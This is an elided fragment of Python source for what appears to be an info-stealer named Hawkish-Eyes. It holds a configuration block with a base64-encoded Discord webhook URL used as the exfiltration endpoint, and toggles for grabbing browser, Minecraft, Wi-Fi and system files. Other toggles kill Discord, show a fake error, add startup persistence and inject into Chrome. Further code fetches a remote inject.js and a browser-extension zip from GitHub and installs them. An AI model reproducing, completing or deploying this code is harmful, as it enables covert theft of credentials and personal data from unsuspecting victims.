...
json_confg = {
    "creator": "DESKTOP-U95BU8Q",
    "webh_secret": "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NzQ3NjIzNjMzNDQwMzU5NC9vV2JMZDI2dHhSR3pEVU16TVgyMnFtb0N1QV8wY3ZROExVejBzV0pzVGVGV3ZHd1FRNGtjcnJBM0RCekJlbW5Dc2lUYw==",
    "browsers_files": "yes",
    "getav_files": "yes",
    "minecraft_files": "yes",
    "sys_files": "yes",
    ...
    "w1f1_files": "yes",
    "hide_config": "yes",
    "pingtype_config": "here",
    "killdiscord_config": True,
    "fake_error_config": "yes",
    "startup_config": "yes",
    "chromenject_config": "yes",
    "url_srdl": f"https://raw.githubusercontent.com/SystemVll/Hawkish-Eyes/main/inject.js",
   ...
   #     return (self.operagx, self.opera, self.brave, self.chrome, self.vivaldi, self.edge, self.yandex, self.iron, self.kiwi)
    ...
    def install_extension(self):
        ...
        try:
            ...
            extensions = {
                'extensions': f'https://github.com/SystemVll/Hawkish-Eyes/raw/main/extensions.zip'
            }
